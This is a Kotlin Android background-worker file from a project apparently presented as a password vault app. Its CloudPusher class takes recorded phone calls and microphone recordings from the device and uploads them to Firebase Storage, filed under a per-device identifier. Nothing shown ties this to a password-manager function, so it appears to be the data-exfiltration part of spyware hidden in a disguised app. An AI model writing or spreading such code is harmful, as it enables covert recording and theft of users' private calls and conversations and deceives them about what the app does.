package com.example.passwordvault.util

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.passwordvault.util.logger.log
import java.io.File
import java.io.FileInputStream

private val tag = CloudPusher::class.java.simpleName

class CloudPusher(val context: Context, private val workerParams: WorkerParameters) :
    Worker(context, workerParams) {

    override fun doWork(): Result {
        val latestRecord = workerParams.inputData.getString(LATEST_RECORD)
        val recordType = workerParams.inputData.getString(RECORDER_TYPE)
        val storageRef = FirebaseStorage.storage().reference
        try {
            val file = File(latestRecord!!)
            if (file.exists()) {
                val stream = FileInputStream(file)
                if (recordType == CALL_RECORDER) {
                    val path =
                        "Users/${PreferenceUtil.uniqueDeviceId(applicationContext)}/Call/${file.name}"
                    storageRef.child(path).putStream(stream)
                    log(tag, "Uploading call recording - ${file.name}")
                } else {
                    val path =
                        "Users/${PreferenceUtil.uniqueDeviceId(applicationContext)}/Mic/${file.name}"
                    storageRef.child(path).putStream(stream)
                    log(tag, "Uploading mic recording - ${file.name}")
                }
            }
        } catch (e: Exception) {
            Log.e(tag, "Failed -> ${e.printStackTrace()}")
        }
        return Result.success()
    }

    override fun onStopped() {
        super.onStopped()
        Log.e(tag, "Stopped")
    }
}